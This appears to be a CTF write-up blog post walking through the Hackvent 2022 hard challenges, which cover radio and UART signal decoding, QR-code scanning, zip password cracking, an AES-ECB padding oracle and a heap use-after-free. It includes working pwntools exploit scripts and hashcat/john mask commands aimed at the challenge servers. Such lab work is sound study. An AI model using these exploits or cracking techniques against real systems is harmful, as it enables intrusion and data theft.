# Hackvent 2022 - Hard

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [physical](/tags#physical )
[radio](/tags#radio ) [universal-radio-hacker](/tags#universal-radio-hacker )
[nrz](/tags#nrz ) [nrz-s](/tags#nrz-s ) [python](/tags#python ) [python-
pil](/tags#python-pil ) [python-pyzbar](/tags#python-pyzbar ) [pulse-
view](/tags#pulse-view ) [sigrok](/tags#sigrok ) [serial](/tags#serial )
[uart](/tags#uart ) [7z](/tags#7z ) [john](/tags#john )
[hashcat](/tags#hashcat ) [john-mask](/tags#john-mask ) [hashcat-
mask](/tags#hashcat-mask ) [aes](/tags#aes ) [aes-ecb](/tags#aes-ecb )
[heap](/tags#heap ) [pwntools](/tags#pwntools ) [unicod](/tags#unicod )  
  
Jan 3, 2023

  * [easy](/hackvent2022/easy)
  * [medium](/hackvent2022/medium)
  * hard

![](https://0xdfimages.gitlab.io/img/hv22-hard-cover.png)

Days fifteen through twentyone were the hard challenges. There were some
really great coding challenges. I loved day sixteen, where I’ll have to check
_tons_ of QRcodes to find the flag. And day twenty, where I’ll abuse a unicode
bug to brute force padding on an AES encryption. There were couple signals
analysis challenges, including a radio wave and serial line decode. There was
also a neat trick abusing how zip archives handle long passwords, and a nice
relateively beginner-friendly heap exploitation.

## HV22.15

### Challenge

![hv22-ball15](https://0xdfimages.gitlab.io/img/hv22-ball15.png) | HV22.15 Message from Space  
---|---  
Categories: |  ![wireless](../img/hv-cat-wireless.png)WIRELESS  
![forensic](../img/hv-cat-forensic.png)FORENSIC  
Level: | hard  
Author: |  cbrunsch   
  
> One of Santa’s elves is a bit of a drunkard and he is incredibly annoyed by
> the banning of beer from soccer stadiums. He is therefore involved in the
> “**No Return to ZIro beer** ” community that pledges for unrestricted access
> to hop brew during soccer games. The topic is sensitive and thus
> communication needs to be top secret, so the community members use a special
> quantum military-grade encryption radio system.
>
> Santa’s wish intel team is not only dedicated to analyzing terrestrial hand-
> written wishes but aims to continuously picking up signals and wishes from
> outer space too. By chance the team got notice of some secret radio
> communication. They notice that the protocol starts with a preamble.
> However, the intel team is keen to learn if the message is some sort of wish
> they should follow-up. Can you lend a hand?

The download is a RDI Acoustic Doppler Current Profiler:

    
    
    $ file message_1msps.cu8 
    message_1msps.cu8: RDI Acoustic Doppler Current Profiler (ADCP)
    

### Solution

#### Raw Analysis

The file is clearly made up of binary non-ASCII data. I’ll look at it with `xxd` running `cat message_1msps.cu8 | xxd | less` to get a feel for it. Looking at the top, it’s all 0x7f, 0x80, and an occasional 0x7e. I can look at this a bit more completely using Python:
    
    
    oxdf@hacky$ python
    Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
    [GCC 9.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> with open('message_1msps.cu8', 'rb') as f:
    ...     bytes = f.read()
    ... 
    >>> from collections import Counter
    >>> Counter(bytes)
    Counter({127: 9321343, 128: 6066621, 126: 559355, 129: 207626, 125: 51129, 121: 43856, 134: 41072, 133: 35989, 130: 35258, 122: 32513, 132: 26601, 123: 25113, 124: 22279, 131: 22227, 120: 15795, 135: 7836, 119: 386, 136: 73})
    

The vast majority of the bytes are in the 126 (0x7e) to 129 (0x81) range, but
there are other values as well.

There’s not much of a pattern to make out looking at the bytes this way.

#### urh

There are lots of audio processing tools out there, but the one that makes
this challenge easiest is [Universal Radio
Hacker](https://github.com/jopohl/urh). I’ll install it with `python -m pip
install urh`, and then open it:

![image-20221216095946618](https://0xdfimages.gitlab.io/img/image-20221216095946618.png)

Opening the file returns this:

![image-20221216100055145](https://0xdfimages.gitlab.io/img/image-20221216100055145.png)

Zooming in on the chunk in the middle, it looks like a wave, where the
amplitude changes between two values:

![image-20221216100148050](https://0xdfimages.gitlab.io/img/image-20221216100148050.png)

#### To Binary Data

It looks like there’s 6 cycles per block, and if I assume that, I can try to
interpret them as bit values:

![img](https://0xdfimages.gitlab.io/img/image-hv22-16-bits.png)

Clicking into the Analysis tab, it does this conversion into bits for me:

![image-20221216100500564](https://0xdfimages.gitlab.io/img/image-20221216100500564.png)

Instead of bits, it can show the result as ASCII, though it’s not right:

![image-20221216101139787](https://0xdfimages.gitlab.io/img/image-20221216101139787.png)

The current “Decoding” is “Non-Return To Zero”, or NRZ. That’s using the
scheme I described above, with high amplitude being a 1, and low being 0.

The [Wikipedia page on NRZ](https://en.wikipedia.org/wiki/Non-return-to-zero)
shows several variations. Given that the theme of this challenge is space,
Non-Return To Zero Space (NRZ(S)) seems interesting. In that scheme, a change
in level is a one, and the same level is a 0.

urh has some other encodings, but not that:

![image-20221216100820742](https://0xdfimages.gitlab.io/img/image-20221216100820742.png)

Clicking on the “…”, I can define my own. The “Differential Encoding” option
under “Additional Functions” seems to be a good match, so I’ll add it by
double-clicking it:

![image-20221216100945136](https://0xdfimages.gitlab.io/img/image-20221216100945136.png)

Clicking “Save as…”, I’ll give it a name:

![image-20221216101035791](https://0xdfimages.gitlab.io/img/image-20221216101035791.png)

Using that encoding, the file starts with all 1s:

![image-20221216101738032](https://0xdfimages.gitlab.io/img/image-20221216101738032.png)

Changing to ASCII, after the first two bytes of 1s (the preamble from the
description?), it is ASCII:

![image-20221216102141896](https://0xdfimages.gitlab.io/img/image-20221216102141896.png)

The full string is:

    
    
    ÿÿSFYyMnt2LXdpc2gtdi1nMHQtYjMzcn0=FYyMnt2LXdpc2gtdi1nMHQtYjMzcn00
    

The string up to the “=” decodes as the flag in base64:

    
    
    $ echo SFYyMnt2LXdpc2gtdi1nMHQtYjMzcn0= | base64 -d
    HV22{v-wish-v-g0t-b33r}
    

**Flag:`HV22{v-wish-v-g0t-b33r}`**

## HV22.16

### Challenge

![hv22-ball16](https://0xdfimages.gitlab.io/img/hv22-ball16.png) | HV22.16 Needle in a qrstack  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | hard  
Author: |  dr_nick   
  
> Santa has lost his flag in a qrstack - it is really like finding a needle in
> a haystack.
>
> Can you help him find it?

The downloaded image is giant (for an image):

    
    
    $ file haystack.png 
    haystack.png: PNG image data, 24800 x 24800, 1-bit grayscale, non-interlaced
    $ ls -lh haystack.png 
    -rw-rw-r-- 1 oxdf oxdf 8.2M Dec 15 20:34 haystack.png
    

It’s a QRcode made up of smaller QRcodes (zoomed version here):

![image-20221216102552182](https://0xdfimages.gitlab.io/img/image-20221216102552182.png)

### Solution

I’ll need to write a program to parse 853,126 sub-images as QRCodes and find
one that has a flag. I’ll show my process in [this
video](https://www.youtube.com/watch?v=geTs9N9Ew6Q):

The final script is:

    
    
    #!/usr/bin/env python3
    
    from PIL import Image
    import pyzbar.pyzbar as pyzbar
    import sys
    
    Image.MAX_IMAGE_PIXELS = 615050000
    
    def get_qrs(im, div_by_arr):
        global count_img, count_codes
        width, height = im.size
        div_by = div_by_arr[0]
    
        sw, sh = width // div_by, height // div_by
    
        for y in range(0, height, sh):
            for x in range(0, width, sw):
                square = im.crop((x, y, x + sw, y + sh))
                count_img += 1
                if len(div_by_arr) > 1:
                    get_qrs(square, div_by_arr[1:])
    
                codes = pyzbar.decode(square, symbols=[pyzbar.ZBarSymbol.QRCODE])
                for code in codes:
                    count_counts += 1
                    if code.data != b"Sorry, no flag here!":
                        print(code.data)
                        print(f'{count_img=}\n{count_codes=}')
                        im.save('flag.png')
                        #sys.exit()
    
    im = Image.open('haystack.png')
    im = im.crop((2400, 2400, 22400, 22400))
    
    count_img, count_codes = 0, 0
    get_qrs(im, [25, 2, 2, 2, 2, 2])
    print(f'{count_img=}\n{count_codes=}')
    

The script runs in a bit over a minute, finding the flag in around 40 seconds:

    
    
    $ time python solve.py 
    b"HV22{1'm_y0ur_need13.}"
      count_img=437543
      count_codes=6979
    Final:
      count_img=853125
      count_codes=14443
    
    real    1m15.869s
    user    1m15.487s
    sys     0m0.369s
    

**Flag:`HV22{1'm_y0ur_need13.}`**

## HV22.17

### Challenge

![hv22-ball17](https://0xdfimages.gitlab.io/img/hv22-ball17.png) | HV22.17 Santa's Sleigh  
---|---  
Categories: |  ![forensic](../img/hv-cat-forensic.png)FORENSIC  
![reverse_engineering](../img/hv-cat-
reverse_engineering.png)REVERSE_ENGINEERING  
Level: | hard  
Author: |  dr_nick   
  
> As everyone seems to modernize, Santa has bought a new E-Sleigh.
> Unfortunately, its speed is limited. Without the sleight’s full
> capabilities, Santa can’t manage to visit all kids… so he asked Rudolf to
> hack the sleigh for him.
>
> I wonder if it worked.
>
> Unfortunately, Rudolph is already on holiday. He seems to be in a strop
> because no one needs him to pull the sledge now. We only got this raw data
> file he sent us.

The file is a single long ASCII line, with 6211 characters:

    
    
    $ file SantasSleigh.raw 
    SantasSleigh.raw: ASCII text, with very long lines, with no line terminators
    $ wc SantasSleigh.raw
       0    1 6211 SantasSleigh.raw
    

The characters are all 0, 1, 2, and 3:

    
    
    $ grep -o . SantasSleigh.raw | sort | uniq -c
        226 0
       1146 1
       1865 2
       2974 3
    

A couple of hints were released on the Hackvent discord when no one solved it:

> Rodolph is heavy on duty during his holiday trip, but he managed to send und
> at least a photo of his first step.

![Image](https://0xdfimages.gitlab.io/img/hv22-17-lcd_connector.jpg)

And then:

> Rudolf finally wants some peace and quiet on vacation. But send us one last
> message: “I thought they speak 8 or 7 N1” together with that picture.

![Image](https://0xdfimages.gitlab.io/img/hv22-17-sniff.png)

### Solution

These are serial line readings, and the tool pictured in the second hint is
[PulseView](https://sigrok.org/wiki/PulseView), part of the [sigrok
project](https://sigrok.org/wiki/Main_Page). These devices are
[UART](https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-
transmitter) devices.

I’ll open PulseView and select “Import Raw binary logic data”:

![image-20221218172427169](https://0xdfimages.gitlab.io/img/image-20221218172427169.png)

I don’t know either of these for sure. I’ll leave number of channels at 8, and
change the sample rate to basically anything (I don’t think it matters). I’ll
use 1200.

It opens like this:

![image-20221218173200805](https://0xdfimages.gitlab.io/img/image-20221218173200805.png)

There are only two channels in use, so I can clear the other 6.

Zooming in, I’ll notice that data is transmitted in chunks of four samples:

![image-20221218173301469](https://0xdfimages.gitlab.io/img/image-20221218173301469.png)

That shows that the baud rate needs to be 1/4 of the sample rate (so 300).

The button at the top right of the menu bar is to add a decoder:

![image-20221218173413173](https://0xdfimages.gitlab.io/img/image-20221218173413173.png)

I’ll click and select UART. It adds, unconfigured:

![image-20221218173440748](https://0xdfimages.gitlab.io/img/image-20221218173440748.png)

I’ll click on it to configure it:

![image-20221218173611355](https://0xdfimages.gitlab.io/img/image-20221218173611355.png)

This applies the decoder to channel 0 with the correct baud rate, 8 databits
and no parity (8N1). By selecting the data format as ASCII, I can see the
messages from 0:

![image-20221218173632075](https://0xdfimages.gitlab.io/img/image-20221218173632075.png)

I could try to add channel 1 as the TX line, but it won’t work. It’s actually
using 7N1. I’ll add a second UART decoder, and configure it:

![image-20221218173737583](https://0xdfimages.gitlab.io/img/image-20221218173737583.png)

Now the replies are there:

![image-20221218173759546](https://0xdfimages.gitlab.io/img/image-20221218173759546.png)

There are some odd bytes mixed in, but the script goes:

> 0: Hello!
>
> 1: Hi.
>
> 0: Tell me the secret!
>
> 1: Never.
>
> 0: So, give me the flag instead.
>
> 1: No way.
>
> 0: Please!
>
> 1: Ok, here it is: HV22{H4ck1ng_S4nta’s_3-Sleigh}
>
> 0: Thx!

![image-20221218174043153](https://0xdfimages.gitlab.io/img/image-20221218174043153.png)

**Flag:`HV22{H4ck1ng_S4nta's_3-Sleigh}`**

## HV22.18

### Challenge

![hv22-ball18](https://0xdfimages.gitlab.io/img/hv22-ball18.png) | HV22.18 Santa's Nice List  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO   
Level: | hard  
Author: |  keep3r   
  
> Santa stored this years “Nice List” in an encrypted zip archive. His mind
> occupied with christmas madness made him forget the password. Luckily one of
> the elves wrote down the SHA-1 hash of the password Santa used.
>  
>  
>      xxxxxx69792b677e3e4c7a6d78545c205c4e5e26
>  
>
> Can you help Santa access the list and make those kids happy?
>
> * * *
>
> In this year’s HACKvent, you can be assured that all bruteforcing hurdles do
> not take longer than 5 minutes on an Intel(R) UHD Graphics 620, if done
> smartly and correctly.

The download is a zip:

    
    
    $ file nice-list.zip 
    nice-list.zip: Zip archive data, at least v?[0x333] to extract
    

Trying to extract asks for a password:

    
    
    $ 7z x nice-list.zip 
    
    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)
    
    Scanning the drive for archives:
    1 file, 554 bytes (1 KiB)
    
    Extracting archive: nice-list.zip
    --
    Path = nice-list.zip
    Type = zip
    Physical Size = 554
    
        
    Enter password (will not be echoed):
    

### Solution

#### Strategy

This challenge is centered around the vulnerability laid out in [this article
on bleepingcomputer](https://www.bleepingcomputer.com/news/security/an-
encrypted-zip-file-can-have-two-correct-passwords-heres-why/). It turns out
that if a zip password is longer than 64 characters, that password is SHA1
hashed, and the resulting bytes are used as the password.

This is cool in a scenario where the password that has a SHA1 hash that’s also
ASCII text, as now there are two different passwords that can be typed in that
will unzip the archive.

I’m given all but the first six bytes of the SHA1 of the password. I’ll note
that all the hex bytes in the remaining hash are in the ascii range:

    
    
    >>> bytes.fromhex('69792b677e3e4c7a6d78545c205c4e5e26')
    b'iy+g~>LzmxT\\ \\N^&'
    

This means there are only three unknown bytes in a potential password.

#### Crack

Three unknown bytes is still 2^24 possible unknowns, so I’ll need to use a
hash cracking tool like `john` or `hashcat` to try. To get a hash that these
can break, I’ll use `zip2john` and save the results into a file:

    
    
    $ zip2john nice-list.zip | tee zip_hashes 
    nice-list.zip/flag.txt:$zip2$*0*3*0*e07f14de6a21906d6353fd5f65bcb339*5664*41*e6f2437b18cd6bf346bab9beaa3051feba189a66c8d12b33e6d643c52d7362c9bb674d8626c119cb73146299db399b2f64e3edcfdaab8bc290fcfb9bcaccef695d*40663473539204e3cefd*$/zip2$:flag.txt:nice-list.zip:nice-list.zip
    nice-list.zip/nice-list-2022.txt:$zip2$*0*3*0*a53ba8a665f2c94e798835ab626994dd*96cc*5b*72b0a11e9ef17568256695cf580c54400f41cfe0055f1b0800ff91374216313ff9b6dc2c9b1309f9765e3873122d8e422e2d9ecd2c7aa6cbf66105ce837a0fe46c18dc6ccc0cb25f59233c9223d699f43bc2e69c5117b307f813fc*6308b50240b2b882b61e*$/zip2$:nice-list-2022.txt:nice-list.zip:nice-list.zip
    

There’s two there, likely the same. Now I can use `john` to crack. The
`--mask` option allows me to give a password with different wildcards in it.
[This cheat sheet](https://haxez.org/wp-
content/uploads/2022/07/HaXeZ_John_The_Ripper_Cheat_Sheet.pdf) has a nice
layout of the different masks:

![image-20221220104242834](https://0xdfimages.gitlab.io/img/image-20221220104242834.png)

So I can use three `?A` to represent the unknown bytes (they don’t have to be
ASCII):

    
    
    $ john --mask='?A?A?Aiy+g~>LzmxT\\ \\N^&' zip_hashes                      
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
    Loaded hashes with cost 1 (HMAC size) varying from 65 to 91                                                                                                                                                        
    Will run 4 OpenMP threads                                                                                
    Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
    0g 0:00:00:04 2.44% (ETA: 22:01:26) 0g/s 66914p/s 135857c/s 135857C/s *niy+g~>LzmxT\ \N^&..aniy+g~>LzmxT\ \N^&         
    4Ltiy+g~>LzmxT\ \N^& (nice-list.zip/nice-list-2022.txt)                 
    4Ltiy+g~>LzmxT\ \N^& (nice-list.zip/flag.txt)     
    2g 0:00:00:08 DONE (2022-12-18 21:58) 0.2490g/s 69371p/s 138743c/s 138743C/s  stiy+g~>LzmxT\ \N^&..eqtiy+g~>LzmxT\ \N^&
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
    

It finds the password in a few seconds.

I could do the same thing with `hashcat` using the `-a 3` to set up a brute-
force or [mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack). I’ll
trim the hashes down to match the format in the [example hashes
page](https://hashcat.net/wiki/doku.php?id=example_hashes) for id 13600. Then
instead of a wordlist, I give the pattern with a similar set of rules to the
ones from `john`:

![image-20221220104603756](https://0xdfimages.gitlab.io/img/image-20221220104603756.png)

I’ll use three `?b` to check all bytes with:

    
    
    $ hashcat -a 3 -m 13600 zip_hashes-hashcat "?b?b?biy+g~>LzmxT\ \N^&"
    ...[snip]...
    $zip2$*0*3*0*a53ba8a665f2c94e798835ab626994dd*96cc*5b*72b0a11e9ef17568256695cf580c54400f41cfe0055f1b0800ff91374216313ff9b6dc2c9b1309f9765e3873122d8e422e2d9ecd2c7aa6cbf66105ce837a0fe46c18dc6ccc0cb25f59233c9223d699f43bc2e69c5117b307f813fc*6308b50240b2b882b61e*$/zip2$:4Ltiy+g~>LzmxT\ \N^&
    $zip2$*0*3*0*e07f14de6a21906d6353fd5f65bcb339*5664*41*e6f2437b18cd6bf346bab9beaa3051feba189a66c8d12b33e6d643c52d7362c9bb674d8626c119cb73146299db399b2f64e3edcfdaab8bc290fcfb9bcaccef695d*40663473539204e3cefd*$/zip2$:4Ltiy+g~>LzmxT\ \N^&
    ...[snip]...
    

#### Unzip

With the password, I’ll use `7z` to extract the files:

    
    
    $ 7z x nice-list.zip 
    
    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)
    
    Scanning the drive for archives:
    1 file, 554 bytes (1 KiB)
    
    Extracting archive: nice-list.zip
    --
    Path = nice-list.zip
    Type = zip
    Physical Size = 554
    
        
    Enter password (will not be echoed):
    Everything is Ok
    
    Files: 2
    Size:       175
    Compressed: 554
    

In addition to `nice-list-2022.txt`, there’s a `flag.txt` which has the flag:

    
    
    $ cat flag.txt 
    HV22{HAVING_FUN_WITH_CHOSEN_PREFIX_PBKDF2_HMAC_COLLISIONS_nzvwuj}
    

**Flag:`HV22{HAVING_FUN_WITH_CHOSEN_PREFIX_PBKDF2_HMAC_COLLISIONS_nzvwuj}`**

## HV22.20

### Challenge

![hv22-ball20](https://0xdfimages.gitlab.io/img/hv22-ball20.png) | HV22.20 § 1337: Use Padding 📝  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO   
Level: | hard  
Author: |  kuyaya   
  
> Santa has written an application to encrypt some secrets he wants to hide
> from the outside world. Only he and his elves, who have access too all the
> keys used, can decrypt the messages 🔐.
>
> Santa’s friends Alice and Bob have suggested that the application has a
> padding vulnerability❗, so Santa fixed it 🎅. This means it’s not vulnerable
> anymore, right❗❓
>
> Santa has also written a concept sheet of the encryption process:

![](https://0xdfimages.gitlab.io/img/18ea12cd-8ac2-4106-a00b-a3075d90d2a8-16715658531192.png)

> * * *
>
> Start the service in the `Resources` section, connect to it with `nc
> <docker> 1337` and get the flag!
>
> You can download the service’s source code from `Resources` section. We
> don’t want to make challenges guessy, do we? 😉

### Solution

#### Source Analysis

The given source for the server is a Python script:

    
    
    #!/usr/bin/env python3
    
    from Crypto.Cipher import AES
    from os import urandom
    
    # pad block size to 16, zfill() fills on left. Invert the string to fill on right, then invert back.
    def pad(msg):
        if len(msg) % 16 != 0:
            msg = msg[::-1].zfill(len(msg) - len(msg) % 16 + 16)[::-1]
        return msg
    
    flag = open('flag.txt').read().strip()
    
    while True:
        aes = AES.new(urandom(16), AES.MODE_ECB)
        msg = input("Enter access code:\n")
        enc = pad(msg) + pad(flag)
        enc = aes.encrypt(pad(enc.encode()))
        print(enc.hex())
    
        retry = input("Do you want to try again [y/n]:\n")
        if retry != "y":
            break
    

Something like `socat` must be exposing this to the internet using port 1337.

#### Strategy

The two bits of data (`msg` and `flag`) are padded as characters before they
are combined, and then the entire thing is converted to bytes (`.encode()`)
and then it’s padded again and encrypted.

I suspect the script author would have done this to prevent me from sending a
message such that there’s only one unknown byte in the last block. If that
were the case, I could generate all possible blocks of one character and then
15 pad bytes, and send them to see which matched the last block of flag.

Because my input is padded, I can’t easily adjust the spacing of `flag`.

The trick is to look for characters that will take up one space as characters,
but multiple bytes once encoded. The emoji littered through the challenge
description are a nice hint. For example, trying some of the symbols in the
challenge text:

    
    
    >>> len('🎅')
    1
    >>> len('🎅'.encode())
    4
    >>> len('❗'.encode())
    3
    >>> len('§'.encode())
    2
    

The last one is most valuable to me, as I can use to shift the flag buffer one
byte at a time.

#### Script

I’ll generate a Python script to exploit this and leak the flag in [this
video](https://www.youtube.com/watch?v=sSZOP9pKc3Q):

The final script is:

    
    
    #!/usr/bin/env python3
    
    import string
    import sys
    from pwn import *
    
    
    r = remote(sys.argv[1], 1337)
    
    
    def probe(msg):
        r.sendlineafter(b"Enter access code:\n", msg)
        res = r.recvline().strip()
        r.sendlineafter(b"[y/n]:\n", b"y")
        return res
    
    
    def pb(res):
        for line in zip(*(iter(res.decode()),)*32):
            print(''.join(line))
    
    
    def get_flag_len():
        for i in range(1, 16):
            res = probe(('0'*16 + '§'*(i+1) + '0'*(16-i)).encode())
            print(i+1)
            pb(res)
    
        
    def get_next_char(flag):
        for c in string.printable[:-6][::-1]:
            print(f'\r{c}{flag}', end='')
            payload = (c + flag[:15])
            payload += (16 - len(payload)) * '0'
            num_multi = (15 + len(flag)) % 16
            payload += '§' * num_multi + '0'* ((16-num_multi) % 16)
            res = probe(payload.encode())
            offset = ((len(flag) + 30) // 16) * -32
            if res[:32] == res[offset:][:32]:
                break
        else:
            assert False
        return c + flag
    
    
    def get_next_char_fast(flag):
        payload = ''
        payload += ''.join(f'{c}{flag[:15]}'.ljust(16, '0') for c in string.printable[:-6])
        n = (len(flag) + 14) % 16 + 1
        payload += '§'*n + '0'*(16-n)
        res = probe(payload.encode())
        offset = ((len(flag) + 30) // 16) * -32
        return string.printable[res.index(res[offset:][:32])//32] + flag
    
    
    flag = ''
    while not flag.startswith('HV22{'):
        flag = get_next_char2(flag)
        print(f'\r{flag}', end='')
    
    print()
    

In the end, I can get the flag:

    
    
    $ python solve.py 152.96.7.9
    [+] Opening connection to 152.96.7.9 on port 1337: Done
    HV22{len()!=len()}
    [*] Closed connection to 152.96.7.9 port 1337
    

**Flag:`HV22{len()!=len()}`**

## HV22.21

### Challenge

![hv22-ball21](https://0xdfimages.gitlab.io/img/hv22-ball21.png) | HV22.21 Santa's Workshop  
---|---  
Categories: |  ![exploitation](../img/hv-cat-exploitation.png)EXPLOITATION   
Level: | hard  
Author: |  0xi   
  
> Santa decided to invite you to his workshop. Can you find a way to pwn it
> and find the flag?

There’s an instance and a binary to download. The binary is a 64-bit ELF:

    
    
    $ file santasworkshop.elf 
    santasworkshop.elf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=14aac965f690be29c5d8a90a8e44e4316e703ce2, not stripped
    

Connecting to the instance or running the binary offer the same menu:

    
    
    $ nc 152.96.7.19 1337
    Welcome to Santa's Workshop
    Enjoy your stay but don't steal anything!
    1 View naughty list
    2 Check the workshop for items
    3 Steal presents
    4 Tell a good deed
    >
    

### Solution

This challenge involves identifying a few key parts:

  * There’s a function that’s not called named `present` that just returns a shell.
  * There’s an information leak in menu item 1 that will give the necessary information to get the address of `present` despite PIE being enabled.
  * There’s a use after free vulnerability on the workshop construct which can be exploited with a combination of menu items 3, then 4, then 2, using the address of `present`.

[This video](https://www.youtube.com/watch?v=pniG3nzVMqE) shows all the steps
to getting shell on the server:

The final exploit script is:

    
    
    #!/usr/bin/env python3
    
    import sys
    from pwn import *
    
    
    r = remote(sys.argv[1], 1337)
    
    # leak present address
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'the entry\n', b'-2147483644')
    res = r.readuntil(b'>')
    pie_leak = u64(res[:-2].ljust(8, b"\x00"))
    present_addr = pie_leak - 0x309
    success(f'Found present address: 0x{present_addr:08x}')
    
    # free workshop
    r.sendline(b'3')
    
    # claim heap allocation
    payload = "0xdf".ljust(40, "\x00").encode() + p64(present_addr)
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'deed?\n', b'48')
    r.sendlineafter(b'deed\n', payload)
    
    # trigger
    r.sendlineafter(b'> ', b'2')
    r.interactive()
    

Running it gives a shell and I can read `FLAG`:

    
    
    $ python solve.py 152.96.7.2 
    [+] Opening connection to 152.96.7.2 on port 1337: Done
    [+] Found present addr: 55a2a13df98a
    [*] Switching to interactive mode
     $ cd challenge
    $ cat FLAG
    
    
            ##############  ##    ####  ####    ##############
            ##          ##  ######  ######  ##  ##          ##
            ##  ######  ##      ##############  ##  ######  ##
            ##  ######  ##      ##    ####  ##  ##  ######  ##
            ##  ######  ##  ########        ##  ##  ######  ##
            ##          ##  ##    ##    ##  ##  ##          ##
            ##############  ##  ##  ##  ##  ##  ##############
                            ##  ######  ######
            ######    ####  ######    ######  ########    ####
            ####  ####    ##  ####    ##    ######        ####
            ######      ######    ##      ##    ##    ##  ####
            ####  ##      ##  ##      ##  ####    ####      ##
                ####  ####    ##  ######        ##  ##      ##
              ##              ##    ##      ####  ##      ##
            ####    ##  ########    ########      ##  ##    ##
                ##        ##      ####  ####  ##########
            ####  ########  ##        ################    ##
                            ##        ########      ##  ##
            ##############    ##  ##        ##  ##  ##      ##
            ##          ##  ######    ##    ##      ####  ####
            ##  ######  ##    ##  ######  ############  ######
            ##  ######  ##      ##  ##        ##          ##
            ##  ######  ##  ######  ########    ##  ##########
            ##          ##  ##    ####  ##    ##  ######
            ##############  ##        ####  ######  ##  ##  ##
    

I had a hard time reading that flag directly, but I loaded it up in Gimp and
colored around the # to make a more readable QR:

![](https://0xdfimages.gitlab.io/img/hv22-21-flag.png)

**Flag:`HV22{PWN_4_TH3_W1N}`**

[« medium](/hackvent2022/medium)

[](/hackvent2022/hard)

